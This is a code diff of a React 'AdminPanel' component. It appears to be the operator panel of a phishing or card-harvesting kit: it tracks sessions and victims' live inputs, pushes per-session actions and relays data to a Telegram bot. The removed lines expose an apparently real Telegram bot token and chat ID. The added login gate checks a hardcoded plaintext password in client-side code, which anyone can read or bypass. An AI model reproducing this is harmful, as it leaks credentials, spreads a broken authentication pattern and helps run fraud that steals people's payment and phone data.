@@ -4,13 +4,27 @@ import { Settings, LogOut, Trash2, CheckCircle2, CreditCard, Lock, Smartphone, R
 import { API_URL } from '../config';
 
 export const AdminPanel: React.FC<{ onBack: () => void }> = ({ onBack }) => {
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [password, setPassword] = useState('');
+  const [authError, setAuthError] = useState('');
   const [activeTab, setActiveTab] = useState<'sessions' | 'config' | 'security'>('sessions');
-  const [botToken, setBotToken] = useState('8586070350:AAHH3zeOKmg5Z45CT_68N14xzEdkLFhY0G0');
-  const [chatId, setChatId] = useState('5219969216');
+  const [botToken, setBotToken] = useState(import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '');
+  const [chatId, setChatId] = useState(import.meta.env.VITE_TELEGRAM_CHAT_ID || '');
   const [sessions, setSessions] = useState<any[]>([]);
   const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
   const [liveInputs, setLiveInputs] = useState<any>({});
   const [currentAction, setCurrentAction] = useState<{[key: string]: string}>({});
+
+  const handleLogin = () => {
+    if (password === 'weareme') {
+      setIsAuthenticated(true);
+      setAuthError('');
+      setPassword('');
+    } else {
+      setAuthError('Invalid password');
+      setPassword('');
+    }
+  };
 
   useEffect(() => {
     const update = async () => {
@@ -91,6 +105,44 @@ export const AdminPanel: React.FC<{ onBack: () => void }> = ({ onBack }) => {
   };
 
   const selectedSession = sessions.find(s => s.id === selectedSessionId);
+
+  // Authentication screen
+  if (!isAuthenticated) {
+    return (
+      <div className="min-h-screen bg-[#0d1421] text-[#94a3b8] p-4 md:p-8 font-sans selection:bg-blue-500/30 flex items-center justify-center">
+        <div className="max-w-sm w-full bg-[#151d2c] border border-slate-800 rounded-2xl p-8 shadow-2xl">
+          <h1 className="text-2xl font-bold text-white mb-2 text-center">Admin Panel</h1>
+          <p className="text-slate-500 text-sm text-center mb-8">Enter password to continue</p>
+          
+          <div className="space-y-4">
+            <div>
+              <input
+                type="password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
+                placeholder="Enter password"
+                className="w-full bg-[#0d1421] border border-slate-800 rounded-xl p-4 text-white font-mono text-sm outline-none focus:border-blue-500/50 focus:ring-4 focus:ring-blue-500/10 transition-all"
+              />
+              {authError && <p className="text-red-400 text-xs mt-2">{authError}</p>}
+            </div>
+            <button
+              onClick={handleLogin}
+              className="w-full bg-blue-600 hover:bg-blue-500 text-white py-3 rounded-xl font-bold transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]"
+            >
+              Login
+            </button>
+            <button
+              onClick={onBack}
+              className="w-full bg-slate-700 hover:bg-slate-600 text-white py-3 rounded-xl font-bold transition-all active:scale-[0.98]"
+            >
+              Back
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-[#0d1421] text-[#94a3b8] p-4 md:p-8 font-sans selection:bg-blue-500/30">
